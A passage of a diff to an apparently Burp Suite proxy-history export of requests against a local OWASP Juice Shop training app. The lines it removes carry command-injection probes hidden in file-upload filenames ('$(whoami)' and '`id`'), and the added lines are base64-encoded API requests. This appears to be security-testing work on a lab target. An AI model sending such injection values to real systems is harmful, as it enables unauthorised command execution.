-<link rel="modulepreload" href="chunk-KD3CNUZG.js"><link rel="modulepreload" href="chunk-PX7UKXVL.js"><link rel="modulepreload" href="chunk-Y3BEW76R.js"><link rel="modulepreload" href="chunk-R7LX7FKI.js"><link rel="modulepreload" href="chunk-7U6P4YGV.js"><link rel="modulepreload" href="chunk-UNFVUBM2.js"><link rel="modulepreload" href="chunk-KI34UYIE.js"><link rel="modulepreload" href="chunk-B3RFAYKZ.js"><link rel="modulepreload" href="chunk-EMJTEAHL.js"><link rel="modulepreload" href="chunk-6RWMKLEX.js"><script src="polyfills.js" type="module"></script><script src="scripts.js" defer></script><script src="main.js" type="module"></script></body>
-</html>
-]]></response>
+    <request base64="true"><![CDATA[R0VUIC9hcGkvQ2hhbGxlbmdlcy8/bmFtZT1TY29yZSUyMEJvYXJkIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0Kc2VjLWNoLXVhLXBsYXRmb3JtOiAiV2luZG93cyINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qDQpzZWMtY2gtdWE6ICJOb3Q7QT1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTUwIg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1MC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpzZWMtY2gtdWEtbW9iaWxlOiA/MA0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogY29ycw0KU2VjLUZldGNoLURlc3Q6IGVtcHR5DQpSZWZlcmVyOiBodHRwOi8vbG9jYWxob3N0OjkwMDAvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IHdlbGNvbWViYW5uZXJfc3RhdHVzPWRpc21pc3M7IGNvb2tpZWNvbnNlbnRfc3RhdHVzPWRpc21pc3M7IGNvbnRpbnVlQ29kZT02N2d3ckpXWjdsZVJFb0R5TmI0MU9WcFE4R212U2pqaG56MHZ6WEszeGpxNjVNa0xCbmE5Mm1ZUGdqcjk7IGxhbmd1YWdlPWVuDQpJZi1Ob25lLU1hdGNoOiBXLyIxZGMtbmlIa3pkUjFQTFJ1SWNGQ3hxNzdKWW1meE9rIg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>305</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxZGMtbmlIa3pkUjFQTFJ1SWNGQ3hxNzdKWW1meE9rIg0KRGF0ZTogVGh1LCAwMyBTZXAgMjAyNiAxODowMDoxOCBHTVQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCktlZXAtQWxpdmU6IHRpbWVvdXQ9NQ0KDQo=]]></response>
     <comment></comment>
   </item>
   <item>
-    <time>Fri Jul 10 00:01:56 IST 2026</time>
-    <url><![CDATA[http://localhost:3000/file-upload?filename=%24(whoami).jpg]]></url>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/api/Challenges/?name=Score%20Board]]></url>
     <host ip="127.0.0.1">localhost</host>
-    <port>3000</port>
+    <port>9000</port>
     <protocol>http</protocol>
     <method><![CDATA[GET]]></method>
-    <path><![CDATA[/file-upload?filename=%24(whoami).jpg]]></path>
+    <path><![CDATA[/api/Challenges/?name=Score%20Board]]></path>
     <extension>null</extension>
-    <request base64="false"><![CDATA[GET /file-upload?filename=%24(whoami).jpg HTTP/1.1
-Host: localhost:3000
-sec-ch-ua-platform: "Windows"
-Accept-Language: en-US,en;q=0.9
-sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
-sec-ch-ua-mobile: ?0
-Accept: */*
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: http://localhost:3000/
-Accept-Encoding: gzip, deflate, br
-Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
-Connection: keep-alive
-
-]]></request>
-    <status>200</status>
-    <responselength>10370</responselength>
-    <mimetype>HTML</mimetype>
-    <response base64="false"><![CDATA[HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-X-Content-Type-Options: nosniff
-X-Frame-Options: SAMEORIGIN
-Feature-Policy: payment 'self'
-X-Recruiting: /#/jobs
-Accept-Ranges: bytes
-Cache-Control: public, max-age=0
-Last-Modified: Thu, 09 Jul 2026 15:29:00 GMT
-ETag: W/"26af-19f477f1b77"
-Content-Type: text/html; charset=UTF-8
-Vary: Accept-Encoding
-Date: Thu, 09 Jul 2026 18:31:56 GMT
-Connection: keep-alive
-Keep-Alive: timeout=5
-Content-Length: 9903
-
-<!--
-  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
-  ~ SPDX-License-Identifier: MIT
-  -->
-
-<!doctype html>
-<html lang="en" data-beasties-container>
-<head>
-  <meta charset="utf-8">
-  <title>OWASP Juice Shop</title>
-  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>
-  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/favicon_js.ico">
-  <script>
-    window.addEventListener("load", function(){
-      window.cookieconsent.initialise({
-        "palette": {
-          "popup": { "background": "var(--theme-primary)", "text": "var(--theme-text)" },
-          "button": { "background": "var(--theme-accent)", "text": "var(--theme-text)" }
-        },
-        "theme": "classic",
-        "position": "bottom-right",
-        "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
-      })});
-  </script>
-<style>.bluegrey-lightgreen-theme{--mat-sys-background:#121316;--mat-sys-error:#ffb4ab;--mat-sys-error-container:#93000a;--mat-sys-inverse-on-surface:#2f3033;--mat-sys-inverse-primary:#005cbb;--mat-sys-inverse-surface:#e3e2e6;--mat-sys-on-background:#e3e2e6;--mat-sys-on-error:#690005;--mat-sys-on-error-container:#ffdad6;--mat-sys-on-primary:#002f65;--mat-sys-on-primary-container:#d7e3ff;--mat-sys-on-primary-fixed:#001b3f;--mat-sys-on-primary-fixed-variant:#00458f;--mat-sys-on-secondary:#283041;--mat-sys-on-secondary-container:#dae2f9;--mat-sys-on-secondary-fixed:#131c2b;--mat-sys-on-secondary-fixed-variant:#3e4759;--mat-sys-on-surface:#e3e2e6;--mat-sys-on-surface-variant:#e0e2ec;--mat-sys-on-tertiary:#173800;--mat-sys-on-tertiary-container:#82ff10;--mat-sys-on-tertiary-fixed:#0b2000;--mat-sys-on-tertiary-fixed-variant:#245100;--mat-sys-outline:#8e9099;--mat-sys-outline-variant:#44474e;--mat-sys-primary:#abc7ff;--mat-sys-primary-container:#00458f;--mat-sys-primary-fixed:#d7e3ff;--mat-sys-primary-fixed-dim:#abc7ff;--mat-sys-scrim:#000000;--mat-sys-secondary:#bec6dc;--mat-sys-secondary-container:#3e4759;--mat-sys-secondary-fixed:#dae2f9;--mat-sys-secondary-fixed-dim:#bec6dc;--mat-sys-shadow:#000000;--mat-sys-surface:#121316;--mat-sys-surface-bright:#38393c;--mat-sys-surface-container:#1f2022;--mat-sys-surface-container-high:#292a2c;--mat-sys-surface-container-highest:#343537;--mat-sys-surface-container-low:#1a1b1f;--mat-sys-surface-container-lowest:#0d0e11;--mat-sys-surface-dim:#121316;--mat-sys-surface-tint:#abc7ff;--mat-sys-surface-variant:#44474e;--mat-sys-tertiary:#70e000;--mat-sys-tertiary-container:#245100;--mat-sys-tertiary-fixed:#82ff10;--mat-sys-tertiary-fixed-dim:#70e000;--mat-sys-neutral-variant20:#2d3038;--mat-sys-neutral10:#1a1b1f;--mat-sys-level0:0px 0px 0px 0px rgba(0, 0, 0, .2), 0px 0px 0px 0px rgba(0, 0, 0, .14), 0px 0px 0px 0px rgba(0, 0, 0, .12);--mat-sys-level1:0px 2px 1px -1px rgba(0, 0, 0, .2), 0px 1px 1px 0px rgba(0, 0, 0, .14), 0px 1px 3px 0px rgba(0, 0, 0, .12);--mat-sys-level2:0px 3px 3px -2px rgba(0, 0, 0, .2), 0px 3px 4px 0px rgba(0, 0, 0, .14), 0px 1px 8px 0px rgba(0, 0, 0, .12);--mat-sys-level3:0px 3px 5px -1px rgba(0, 0, 0, .2), 0px 6px 10px 0px rgba(0, 0, 0, .14), 0px 1px 18px 0px rgba(0, 0, 0, .12);--mat-sys-level4:0px 5px 5px -3px rgba(0, 0, 0, .2), 0px 8px 10px 1px rgba(0, 0, 0, .14), 0px 3px 14px 2px rgba(0, 0, 0, .12);--mat-sys-level5:0px 7px 8px -4px rgba(0, 0, 0, .2), 0px 12px 17px 2px rgba(0, 0, 0, .14), 0px 5px 22px 4px rgba(0, 0, 0, .12);--mat-sys-corner-extra-large:28px;--mat-sys-corner-extra-large-top:28px 28px 0 0;--mat-sys-corner-extra-small:4px;--mat-sys-corner-extra-small-top:4px 4px 0 0;--mat-sys-corner-full:9999px;--mat-sys-corner-large:16px;--mat-sys-corner-large-end:0 16px 16px 0;--mat-sys-corner-large-start:16px 0 0 16px;--mat-sys-corner-large-top:16px 16px 0 0;--mat-sys-corner-medium:12px;--mat-sys-corner-none:0;--mat-sys-corner-small:8px;--mat-sys-dragged-state-layer-opacity:.16;--mat-sys-focus-state-layer-opacity:.12;--mat-sys-hover-state-layer-opacity:.08;--mat-sys-pressed-state-layer-opacity:.12;color:var(--mat-sys-on-surface);background-color:var(--mat-sys-surface)}html{font-family:var(--mat-sys-body-medium-font, Roboto, "Helvetica Neue", sans-serif)}.bluegrey-lightgreen-theme{--theme-primary:#438fff;--theme-primary-lighter:rgb(97.6, 161.229787234, 255);--theme-primary-light:rgb(118, 173.3829787234, 255);--theme-primary-darker:rgb(36.4, 124.770212766, 255);--theme-primary-dark:rgb(16, 112.6170212766, 255);--theme-primary-fade-10:#438fff;--theme-primary-fade-20:#438fff;--theme-primary-fade-30:#438fff;--theme-primary-fade-40:#438fff;--theme-primary-fade-50:#438fff;--theme-accent:#50a400;--theme-accent-lighter:rgb(94.9268292683, 194.6, 0);--theme-accent-light:rgb(104.8780487805, 215, 0);--theme-accent-darker:rgb(65.0731707317, 133.4, 0);--theme-accent-dark:rgb(55.1219512195, 113, 0);--theme-accent-fade-10:#50a400;--theme-accent-fade-20:#50a400;--theme-accent-fade-30:#50a400;--theme-accent-fade-40:#50a400;--theme-accent-fade-50:#50a400;--theme-warn:#ffb4ab;--theme-warn-lighter:rgb(255, 207.3214285714, 201.6);--theme-warn-light:rgb(255, 225.5357142857, 222);--theme-warn-darker:rgb(255, 152.6785714286, 140.4);--theme-warn-dark:rgb(255, 134.4642857143, 120);--theme-warn-fade-10:#ffb4ab;--theme-warn-fade-20:#ffb4ab;--theme-warn-fade-30:#ffb4ab;--theme-warn-fade-40:#ffb4ab;--theme-warn-fade-50:#ffb4ab;--theme-text:#e3e2e6;--theme-text-lighter:rgb(242.8666666667, 242.4333333333, 244.1666666667);--theme-text-light:rgb(253.4444444444, 253.3888888889, 253.6111111111);--theme-text-darker:rgb(200.5555555556, 198.6111111111, 206.3888888889);--theme-text-dark:rgb(160.8888888889, 157.5277777778, 170.9722222222);--theme-text-fade-10:#e3e2e6;--theme-text-fade-20:#e3e2e6;--theme-text-fade-30:#e3e2e6;--theme-text-fade-40:#e3e2e6;--theme-text-fade-50:#e3e2e6;--theme-text-invert-15:rgb(197.15, 196.45, 199.25);--theme-text-invert-30:rgb(167.3, 166.9, 168.5);--theme-background:#1f2022;--theme-background-lighter:rgb(45.5938461538, 47.0646153846, 50.0061538462);--theme-background-light:rgb(55.3230769231, 57.1076923077, 60.6769230769);--theme-background-darker:rgb(16.4061538462, 16.9353846154, 17.9938461538);--theme-background-dark:rgb(6.6769230769, 6.8923076923, 7.3230769231);--theme-background-darkest:hsl(220, 4.6153846154%, -1.2549019608%);--theme-thumbnail-border:1px solid #abc7ff;--mdc-filled-text-field-container-color:#0000;--mdc-filled-text-field-disabled-container-color:#0000;--theme-background:#3e3e3e;--theme-background-lighter:#4a4a4a;--theme-background-light:#5a5a5a;--theme-background-darker:#333638;--theme-background-dark:#303030;--theme-background-darkest:#2b2b2b;--theme-text:#e8ecef;--theme-text-lighter:#f2f5f7;--theme-text-light:#fff;--theme-text-darker:#b8c0c7;--theme-text-dark:#7f8a93;--mat-sys-surface:#333638;--mat-sys-on-surface:#e8ecef;--mat-sys-surface-container:#3e3e3e;--mat-sys-surface-container-high:#404244;--mat-sys-on-surface-variant:#b8c0c7;--mat-sys-outline:#5a5a5a;--mat-sys-outline-variant:#404244}.bluegrey-lightgreen-theme{--theme-warn:#f44336;--theme-warn-lighter:rgb(245.5877358491, 94.1358490566, 83.0122641509);--theme-warn-light:rgb(246.6462264151, 112.2264150943, 102.3537735849);--theme-warn-darker:rgb(242.4122641509, 39.8641509434, 24.9877358491);--theme-warn-dark:rgb(234.1839622642, 27.9622641509, 12.8160377358);--theme-warn-fade-10:#f44336;--theme-warn-fade-20:#f44336;--theme-warn-fade-30:#f44336;--theme-warn-fade-40:#f44336;--theme-warn-fade-50:#f44336;--mat-sys-error:#f44336;--mat-sys-on-error:#fff}@media screen and (-webkit-min-device-pixel-ratio:0){}</style><link rel="stylesheet" href="styles.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.css"></noscript></head>
-<body class="bluegrey-lightgreen-theme">
-  <app-root></app-root>
-<link rel="modulepreload" href="chunk-KD3CNUZG.js"><link rel="modulepreload" href="chunk-PX7UKXVL.js"><link rel="modulepreload" href="chunk-Y3BEW76R.js"><link rel="modulepreload" href="chunk-R7LX7FKI.js"><link rel="modulepreload" href="chunk-7U6P4YGV.js"><link rel="modulepreload" href="chunk-UNFVUBM2.js"><link rel="modulepreload" href="chunk-KI34UYIE.js"><link rel="modulepreload" href="chunk-B3RFAYKZ.js"><link rel="modulepreload" href="chunk-EMJTEAHL.js"><link rel="modulepreload" href="chunk-6RWMKLEX.js"><script src="polyfills.js" type="module"></script><script src="scripts.js" defer></script><script src="main.js" type="module"></script></body>
-</html>
-]]></response>
+    <request base64="true"><![CDATA[R0VUIC9hcGkvQ2hhbGxlbmdlcy8/bmFtZT1TY29yZSUyMEJvYXJkIEhUVFAvMS4xDQpIb3N0OiBsb2NhbGhvc3Q6OTAwMA0Kc2VjLWNoLXVhLXBsYXRmb3JtOiAiV2luZG93cyINCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjkNCkFjY2VwdDogYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qDQpzZWMtY2gtdWE6ICJOb3Q7QT1CcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iMTUwIg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE1MC4wLjAuMCBTYWZhcmkvNTM3LjM2DQpzZWMtY2gtdWEtbW9iaWxlOiA/MA0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogY29ycw0KU2VjLUZldGNoLURlc3Q6IGVtcHR5DQpSZWZlcmVyOiBodHRwOi8vbG9jYWxob3N0OjkwMDAvDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb29raWU6IHdlbGNvbWViYW5uZXJfc3RhdHVzPWRpc21pc3M7IGNvb2tpZWNvbnNlbnRfc3RhdHVzPWRpc21pc3M7IGNvbnRpbnVlQ29kZT02N2d3ckpXWjdsZVJFb0R5TmI0MU9WcFE4R212U2pqaG56MHZ6WEszeGpxNjVNa0xCbmE5Mm1ZUGdqcjk7IGxhbmd1YWdlPWVuDQpJZi1Ob25lLU1hdGNoOiBXLyIxZGMtbmlIa3pkUjFQTFJ1SWNGQ3hxNzdKWW1meE9rIg0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQo=]]></request>
+    <status>304</status>
+    <responselength>305</responselength>
+    <mimetype></mimetype>
+    <response base64="true"><![CDATA[SFRUUC8xLjEgMzA0IE5vdCBNb2RpZmllZA0KQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAqDQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLUZyYW1lLU9wdGlvbnM6IFNBTUVPUklHSU4NCkZlYXR1cmUtUG9saWN5OiBwYXltZW50ICdzZWxmJw0KWC1SZWNydWl0aW5nOiAvIy9qb2JzDQpFVGFnOiBXLyIxZGMtbmlIa3pkUjFQTFJ1SWNGQ3hxNzdKWW1meE9rIg0KRGF0ZTogVGh1LCAwMyBTZXAgMjAyNiAxODowMDoxOCBHTVQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCktlZXAtQWxpdmU6IHRpbWVvdXQ9NQ0KDQo=]]></response>
     <comment></comment>
   </item>
   <item>
-    <time>Fri Jul 10 00:01:56 IST 2026</time>
-    <url><![CDATA[http://localhost:3000/file-upload?filename=%60id%60.php]]></url>
+    <time>Thu Sep 03 23:30:18 IST 2026</time>
+    <url><![CDATA[http://localhost:9000/api/Quantitys/]]></url>
     <host ip="127.0.0.1">localhost</host>
-    <port>3000</port>
+    <port>9000</port>
     <protocol>http</protocol>
     <method><![CDATA[GET]]></method>
-    <path><![CDATA[/file-upload?filename=%60id%60.php]]></path>
+    <path><![CDATA[/api/Quantitys/]]></path>
     <extension>null</extension>
-    <request base64="false"><![CDATA[GET /file-upload?filename=%60id%60.php HTTP/1.1
-Host: localhost:3000
-sec-ch-ua-platform: "Windows"
-Accept-Language: en-US,en;q=0.9
-sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
-sec-ch-ua-mobile: ?0
-Accept: */*
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: http://localhost:3000/
-Accept-Encoding: gzip, deflate, br
-Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=2PaW3mD5oBa7Mp6PLlyrQKw2zd52S77hJeGORx1Nkeb49VvJZq8gjnEXYZr3
-Connection: keep-alive
-
-]]></request>
-    <status>200</status>
-    <responselength>10370</responselength>
-    <mimetype>HTML</mimetype>
-    <response base64="false"><![CDATA[HTTP/1.1 200 OK
-Access-Control-Allow-Origin: *
-X-Content-Type-Options: nosniff
-X-Frame-Options: SAMEORIGIN
-Feature-Policy: payment 'self'
-X-Recruiting: /#/jobs
-Accept-Ranges: bytes
-Cache-Control: public, max-age=0
-Last-Modified: Thu, 09 Jul 2026 15:29:00 GMT
-ETag: W/"26af-19f477f1b77"
-Content-Type: text/html; charset=UTF-8
-Vary: Accept-Encoding
-Date: Thu, 09 Jul 2026 18:31:56 GMT
-Connection: keep-alive
-Keep-Alive: timeout=5
-Content-Length: 9903
-
-<!--
-  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
-  ~ SPDX-License-Identifier: MIT
-  -->
-
-<!doctype html>
-<html lang="en" data-beasties-container>
-<head>
-  <meta charset="utf-8">
-  <title>OWASP Juice Shop</title>
-  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2) format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}</style>
-  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/favicon_js.ico">
-  <script>
-    window.addEventListener("load", function(){
-      window.cookieconsent.initialise({
-        "palette": {
-          "popup": { "background": "var(--theme-primary)", "text": "var(--theme-text)" },
-          "button": { "background": "var(--theme-accent)", "text": "var(--theme-text)" }
-        },
-        "theme": "classic",
-        "position": "bottom-right",
-        "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
-      })});
-  </script>
-<style>.bluegrey-lightgreen-theme{--mat-sys-background:#121316;--mat-sys-error:#ffb4ab;--mat-sys-error-container:#93000a;--mat-sys-inverse-on-surface:#2f3033;--mat-sys-inverse-primary:#005cbb;--mat-sys-inverse-surface:#e3e2e6;--mat-sys-on-background:#e3e2e6;--mat-sys-on-error:#690005;--mat-sys-on-error-container:#ffdad6;--mat-sys-on-primary:#002f65;--mat-sys-on-primary-container:#d7e3ff;--mat-sys-on-primary-fixed:#001b3f;--mat-sys-on-primary-fixed-variant:#00458f;--mat-sys-on-secondary:#283041;--mat-sys-on-secondary-container:#dae2f9;--mat-sys-on-secondary-fixed:#131c2b;--mat-sys-on-secondary-fixed-variant:#3e4759;--mat-sys-on-surface:#e3e2e6;--mat-sys-on-surface-variant:#e0e2ec;--mat-sys-on-tertiary:#173800;--mat-sys-on-tertiary-container:#82ff10;--mat-sys-on-tertiary-fixed:#0b2000;--mat-sys-on-tertiary-fixed-variant:#245100;--mat-sys-outline:#8e9099;--mat-sys-outline-variant:#44474e;--mat-sys-primary:#abc7ff;--mat-sys-primary-container:#00458f;--mat-sys-primary-fixed:#d7e3ff;--mat-sys-primary-fixed-dim:#abc7ff;--mat-sys-scrim:#000000;--mat-sys-secondary:#bec6dc;--mat-sys-secondary-container:#3e4759;--mat-sys-secondary-fixed:#dae2f9;--mat-sys-secondary-fixed-dim:#bec6dc;--mat-sys-shadow:#000000;--mat-sys-surface:#121316;--mat-sys-surface-bright:#38393c;--mat-sys-surface-container:#1f2022;--mat-sys-surface-container-high:#292a2c;--mat-sys-surface-container-highest:#343537;--mat-sys-surface-container-low:#1a1b1f;--mat-sys-surface-container-lowest:#0d0e11;--mat-sys-surface-dim:#121316;--mat-sys-surface-tint:#abc7ff;--mat-sys-surface-variant:#44474e;--mat-sys-tertiary:#70e000;--mat-sys-tertiary-container:#245100;--mat-sys-tertiary-fixed:#82ff10;--mat-sys-tertiary-fixed-dim:#70e000;--mat-sys-neutral-variant20:#2d3038;--mat-sys-neutral10:#1a1b1f;--mat-sys-level0:0px 0px 0px 0px rgba(0, 0, 0, .2), 0px 0px 0px 0px rgba(0, 0, 0, .14), 0px 0px 0px 0px rgba(0, 0, 0, .12);--mat-sys-level1:0px 2px 1px -1px rgba(0, 0, 0, .2), 0px 1px 1px 0px rgba(0, 0, 0, .14), 0px 1px 3px 0px rgba(0, 0, 0, .12);--mat-sys-level2:0px 3px 3px -2px rgba(0, 0, 0, .2), 0px 3px 4px 0px rgba(0, 0, 0, .14), 0px 1px 8px 0px rgba(0, 0, 0, .12);--mat-sys-level3:0px 3px 5px -1px rgba(0, 0, 0, .2), 0px 6px 10px 0px rgba(0, 0, 0, .14), 0px 1px 18px 0px rgba(0, 0, 0, .12);--mat-sys-level4:0px 5px 5px -3px rgba(0, 0, 0, .2), 0px 8px 10px 1px rgba(0, 0, 0, .14), 0px 3px 14px 2px rgba(0, 0, 0, .12);--mat-sys-level5:0px 7px 8px -4px rgba(0, 0, 0, .2), 0px 12px 17px 2px rgba(0, 0, 0, .14), 0px 5px 22px 4px rgba(0, 0, 0, .12);--mat-sys-corner-extra-large:28px;--mat-sys-corner-extra-large-top:28px 28px 0 0;--mat-sys-corner-extra-small:4px;--mat-sys-corner-extra-small-top:4px 4px 0 0;--mat-sys-corner-full:9999px;--mat-sys-corner-large:16px;--mat-sys-corner-large-end:0 16px 16px 0;--mat-sys-corner-large-start:16px 0 0 16px;--mat-sys-corner-large-top:16px 16px 0 0;--mat-sys-corner-medium:12px;--mat-sys-corner-none:0;--mat-sys-corner-small:8px;--mat-sys-dragged-state-layer-opacity:.16;--mat-sys-focus-state-layer-opacity:.12;--mat-sys-hover-state-layer-opacity:.08;--mat-sys-pressed-state-layer-opacity:.12;color:var(--mat-sys-on-surface);background-color:var(--mat-sys-surface)}html{font-family:var(--mat-sys-body-medium-font, Roboto, "Helvetica Neue", sans-serif)}.bluegrey-lightgreen-theme{--theme-primary:#438fff;--theme-primary-lighter:rgb(97.6, 161.229787234, 255);--theme-primary-light:rgb(118, 173.3829787234, 255);--theme-primary-darker:rgb(36.4, 124.770212766, 255);--theme-primary-dark:rgb(16, 112.6170212766, 255);--theme-primary-fade-10:#438fff;--theme-primary-fade-20:#438fff;--theme-primary-fade-30:#438fff;--theme-primary-fade-40:#438fff;--theme-primary-fade-50:#438fff;--theme-accent:#50a400;--theme-accent-lighter:rgb(94.9268292683, 194.6, 0);--theme-accent-light:rgb(104.8780487805, 215, 0);--theme-accent-darker:rgb(65.0731707317, 133.4, 0);--theme-accent-dark:rgb(55.1219512195, 113, 0);--theme-accent-fade-10:#50a400;--theme-accent-fade-20:#50a400;--theme-accent-fade-30:#50a400;--theme-accent-fade-40:#50a400;--theme-accent-fade-50:#50a400;--theme-warn:#ffb4ab;--theme-warn-lighter:rgb(255, 207.3214285714, 201.6);--theme-warn-light:rgb(255, 225.5357142857, 222);--theme-warn-darker:rgb(255, 152.6785714286, 140.4);--theme-warn-dark:rgb(255, 134.4642857143, 120);--theme-warn-fade-10:#ffb4ab;--theme-warn-fade-20:#ffb4ab;--theme-warn-fade-30:#ffb4ab;--theme-warn-fade-40:#ffb4ab;--theme-warn-fade-50:#ffb4ab;--theme-text:#e3e2e6;--theme-text-lighter:rgb(242.8666666667, 242.4333333333, 244.1666666667);--theme-text-light:rgb(253.4444444444, 253.3888888889, 253.6111111111);--theme-text-darker:rgb(200.5555555556, 198.6111111111, 206.3888888889);--theme-text-dark:rgb(160.8888888889, 157.5277777778, 